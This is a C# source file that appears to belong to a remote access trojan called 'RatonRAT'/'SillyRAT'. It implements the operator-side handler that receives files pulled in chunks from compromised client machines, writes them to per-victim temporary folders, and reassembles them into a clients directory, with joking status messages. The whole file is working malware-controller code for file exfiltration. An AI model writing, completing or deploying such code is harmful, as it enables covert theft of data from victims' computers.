using RatonRAT.ClientForms;
using Server.Connection;
using SillyRAT;
using Stuff;
using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatonRAT.Handlers.FileTransfer
{
// hsdIDo3_100
    internal class HandleDownload
    {
        public async void Run(SillyClient SillyClient, Unpack unpack)
        {
            string duid = unpack.GetAsString("DUID");
            string formname = "File ID: ";
            FormFile formFile = (FormFile)Application.OpenForms[formname + duid];
            if (formFile != null)
            {
                try
                {
                    if (formFile.SillyClient == null)
                    {
                        formFile.SillyClient = SillyClient;
                        formFile.timer1.Start();
                    }

                    await Task.Run(async () =>
                    {
                        string uid = unpack.GetAsString("UID");
                        string fileName = unpack.GetAsString("FileName");
                        long fileSize = unpack.GetAsLong("FileSize");
                        byte[] fileBytes = unpack.GetAsByteArray("FileBytes");
                        formFile.UID = uid;
                        formFile.FileName = fileName;
                        formFile.FileSize = fileSize;
                        string TempName = unpack.GetAsString("TempName");
                        if (!string.IsNullOrEmpty(TempName))
                        {
                            await STF(uid, TempName, fileBytes);
                            lock (formFile.OneByOne)
                            {
                                formFile.TotalFileSize += fileBytes.Length;
                            }
                            if (formFile.TotalFileSize == fileSize)
                            {
                                Thread.Sleep(1500);
                                formFile.progressBar1.Value = 100;
                                formFile.timer2.Stop();
                                formFile.Status("Exporting...");
                                Thread.Sleep(1500);
                                long TempCount = unpack.GetAsInteger("TempCount");
                                await SF(uid, duid, fileName, TempCount, formFile);
                                Thread.Sleep(1500);
                                formFile.Status("File downloaded, yay!!1");
                                Thread.Sleep(500);
                                if (formFile.InvokeRequired)
                                {
                                    formFile.Invoke(new MethodInvoker(() => formFile.Close()));
                                }
                            }
                        }
                    });
                }
                catch (Exception ex)
                {
                    formFile.timer2.Stop();
                    formFile.Status("Our rats died (fail) on the download");
                    string err = ex.Message;
                    MessageBox.Show(err, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
        public async Task STF(string uid, string fileName, byte[] fileBytes)
        {
            string tempFolder = Path.Combine(Program.DataFolder, uid);
            if (!Directory.Exists(tempFolder)) Directory.CreateDirectory(tempFolder);
            string filePath = Path.Combine(tempFolder, fileName);
            using (FileStream fileStream = new FileStream(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite))
            {
                await fileStream.WriteAsync(fileBytes, 0, fileBytes.Length);
            }
        }
        public async Task SF(string uid, string duid, string fileName, long TempCount, FormFile ff)
        {
            string clientFolder = Path.Combine(Program.ClientsFolder, uid);
            if (!Directory.Exists(clientFolder)) Directory.CreateDirectory(clientFolder);
            string filePath = Path.Combine(clientFolder, fileName);

            if (TempCount > 0)
            {
                using (FileStream fileStream = new FileStream(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite))
                {
                    string tempFolder = Path.Combine(Program.DataFolder, uid);
                    int offset = 0;
                    for (int i = 1; i <= TempCount; i++)
                    {
                        string TempName = Helpers.MD5_STRING(Encoding.UTF8.GetBytes(fileName + duid + i.ToString()));
                        string TempFilePath = Path.Combine(tempFolder, TempName);
                        if (!File.Exists(TempFilePath)) continue;
                        byte[] TempFileBytes = File.ReadAllBytes(TempFilePath);
                        await fileStream.WriteAsync(TempFileBytes, offset, TempFileBytes.Length);
                        File.Delete(TempFilePath);
                        ff.Status($"Exporting ({i}/{TempCount})");
                    }
                }
            }
        }
    }
}
